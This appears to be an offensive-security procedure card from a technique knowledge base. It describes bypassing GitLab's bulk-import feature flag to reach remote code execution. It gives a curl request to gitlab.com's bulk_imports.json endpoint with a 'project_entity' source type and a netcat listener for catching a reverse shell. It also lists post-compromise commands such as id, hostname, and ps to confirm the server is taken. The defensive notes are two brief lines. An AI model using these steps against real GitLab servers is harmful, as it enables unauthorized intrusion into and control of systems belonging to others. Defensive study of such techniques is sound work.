---
tags:
  - bypass
  - rce
type: procedure
tools:
  - '[[tools/Flask]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
platforms:
  - Linux
  - GitLab
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 33da7be3-87d1-4f17-82b5-3784922ab9b1
created_at: '2025-12-11T03:48:06.009Z'
updated_at: '2025-12-11T03:48:06.009Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
---
# Bypass Feature Flag and Verify RCE

## Summary

This procedure bypasses the bulk_import_projects feature flag using a direct API call and verifies RCE by catching a reverse shell and executing commands.

## Description

Sends a POST request with source_type: project_entity to trigger the pipeline without the flag, then uses a listener to confirm shell access and run verification commands.

## Requirements

1. GitLab API access
2. Listener host
3. Malicious payload in import

## Defense

Defensive measures and detection strategies:

- Validate source_type parameters
- Monitor for reverse shell connections

## Objectives

1. Initiate bypass import
2. Catch and interact with shell
3. Verify server compromise

## Instructions

### Step 1: Send Bypass Request

**Context**: POST to bulk_imports.json to bypass flag.

**Command** ([[commands/curl-bulk-import]]):
```bash
curl 'https://gitlab.com/import/bulk_imports.json' -H ... --data-raw '{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"secret-vakzz","destination_name":"group1aaa"}]}'
```

> Initiates import without feature flag.

### Step 2: Set Up Listener

**Context**: Listen for reverse shell.

**Command** ([[commands/nc-listen]]):
```bash
nc -vnlkp 12345
```

> Waits for connection.

### Step 3: Verify with Commands

**Context**: Run commands in shell.

**Command** ([[commands/id]]):
```bash
id
```

> Shows user ID.

**Command** ([[commands/hostname-f]]):
```bash
hostname -f
```

> Shows hostname.

**Command** ([[commands/ls-asl]]):
```bash
ls -asl /tmp
```

> Lists /tmp.

**Command** ([[commands/cat-file]]):
```bash
cat /tmp/1234
```

> Reads file.

**Command** ([[commands/ps-auxww]]):
```bash
ps auxww
```

> Lists processes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/curl-bulk-import]]
- [[commands/nc-listen]]
- [[commands/id]]
- [[commands/hostname-f]]
- [[commands/ls-asl]]
- [[commands/cat-file]]
- [[commands/ps-auxww]]

## Tools Used

- #curl
- #nc

## Tags

- #bypass
- #rce
